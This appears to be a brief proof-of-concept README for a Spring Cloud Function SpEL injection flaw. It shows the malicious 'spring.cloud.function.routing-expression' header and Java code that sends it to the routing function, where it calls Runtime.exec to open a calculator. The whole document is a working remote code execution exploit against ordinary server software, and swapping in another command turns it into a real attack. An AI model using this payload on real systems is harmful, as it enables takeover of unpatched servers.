# spring-spel-0day-poc
header
```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
```
## Poc
```
Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);
Message<String> message = MessageBuilder.withPayload("hello")
 				.setHeader(FunctionProperties.PREFIX + ".routing-expression",
 						"T(java.lang.Runtime).getRuntime().exec(\"open -a calculator.app\")")
 				.build();
function.apply(message);
```
